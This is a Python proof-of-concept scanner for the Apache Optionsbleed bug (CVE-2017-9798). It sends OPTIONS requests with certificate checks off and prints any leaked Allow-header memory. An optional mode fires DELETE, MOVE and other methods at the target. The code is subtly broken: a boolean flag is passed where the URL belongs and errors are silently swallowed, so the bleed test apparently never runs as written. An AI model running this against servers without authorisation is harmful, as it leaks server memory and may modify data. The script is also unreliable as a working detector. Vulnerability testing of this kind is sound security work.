#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Optionsbleed proof of concept test by Hanno BÃ¶ck
#
#
# Modified by MickCue(GitHub) | Forked - Added cookie support, changed to use requests and HTTP method test

import argparse
import re
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#{major}.{minor}.{build}.{patch}
__version__ = '0.1'
logo = """
 __  __ ___  __      __ __     __ __ __             
/  \|__) | |/  \|\ |(_ |__)|  |_ |_ |  \   _|_  _|_ 
\__/|    | |\__/| \|__)|__)|__|__|__|__/    |    |  
"""+__version__+"""
"""


session = ""
user_agent = {'User-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'}
http_methods = ["DELETE","TRACE","TRACK","CONNECT","PROPFIND","PROPPATCH","MKCOL","COPY","MOVE",
"LOCK","UNLOCK","VERSION-CONTROL","REPORT","CHECKOUT","CHECKIN","UNCHECKOUT","MKWORKSPACE","UPDATE","LABEL",
"MERGE","BASELINE-CONTROL","OPTIONS","MKACTIVITY","ORDERPATCH","ACL","PATCH","SEARCH","ARBITRARY]"]
fail = []

def test_methods(url, args):
   

    if args.cookie:
        count = 0
        count_down = 0
        for h in http_methods:
            count += 1
        #count_down = count
        session = args.cookie
        for method in http_methods:

            req = requests.request(method.lower(), args.hosttocheck, cookies={''+session.split('=')[0]+'':''+session.split('=')[1]+''},  verify=False)
            if req.status_code == 200:
                fail.append(method.lower())

            percentage_completed = ( count_down / count * 100 / 1 )
            print(str(round(percentage_completed))+"% completed")
            count_down += 1


    else:
        count = 0
        count_down = 0
        for h in http_methods:
            count += 1


        for method in http_methods:

            req = requests.request(method.lower(), args.hosttocheck, verify=False)
            if req.status_code == 200:
                fail.append(method.lower())

            percentage_completed = ( count_down / count * 100 / 1 )
            print(str(round(percentage_completed))+"% completed")
            count_down += 1


    if fail:
        for x in range(0, 5):
            print("")
        print("Application is vulnerable to the following methods...")
        for bad_method in fail:
            print("Method: "+bad_method)

        for x in range(0, 5):
            print("")


def test_bleed(url, args):

    if args.cookie:
        session = args.cookie

        r = requests.options(url , headers = user_agent , cookies={''+session.split('=')[0]+'':''+session.split('=')[1]+''}, verify=False)

    else:
        r = requests.options(url , headers = user_agent , verify=False)


    raw_headers = r.headers
    allow= ""


    for a in raw_headers:

        if "Allow" in a:
            allow = r.headers['allow']


    if allow == "":
        print("[empty] %s" % (url))
        return False
    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$", allow):
        
        z = [x.strip() for x in allow.split(',')]
        if len(z) > len(set(z)):
            print("[duplicates] %s: %s" % (url, repr(allow)))
        elif args.all:
            print("[ok] %s: %s" % (url, repr(allow)))
        #else:
            #print("[No Issues]")

    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$", allow):
        print("[spaces] %s: %s" % (url, repr(allow)))
    else:
        print("[bleed] %s: %s" % (url, repr(allow)))
    return True

print(logo+"\n")
parser = argparse.ArgumentParser(
         description='Check for the Optionsbleed vulnerability (CVE-2017-9798).',
         epilog="Tests server for Optionsbleed bug and other bugs in the allow header.\n\n"
         "Explanation of results:\n"
         "[bleed] corrupted header found, vulnerable\n"
         "[empty] empty allow header, does not make sense\n"
         "[spaces] space-separated method list (should be comma-separated)\n"
         "[duplicates] duplicates in list (may be apache bug 61207)\n"
         "[ok] normal list found (only shown with -a/--all)\n",
         formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('hosttocheck',  action='store',
                    help='The hostname you want to test against')
parser.add_argument('-n', nargs=1, type=int, default=[10],
                    help='number of tests (default 10)')
parser.add_argument("-a", "--all", action="store_true",
                    help="show headers from hosts without problems")
parser.add_argument("-u", "--url", action='store_true',
                    help="pass URL instead of hostname")
parser.add_argument("-c", "--cookie", help="add Cookie")
parser.add_argument("-m", "--methods", help="Test for malicious HTTP methods", action="store_true")


args = parser.parse_args()
howoften = int(args.n[0])


if args.url:

    if args.methods:
        print("Testing HTTP Methods")
        test_methods(args.url, args)
    for x in range(0, 5):
        print("")
    print("Testing OPTIONSBLEED")

    for i in range(howoften):
            try:
                if test_bleed(args.url, args) is False:
                    break
            except Exception as e:
                pass

else:
    for x in range(0, 5):
        print("")
    print("Error")
    print("Example: optionsbleed -u https://example.com -c session=1234 -m")
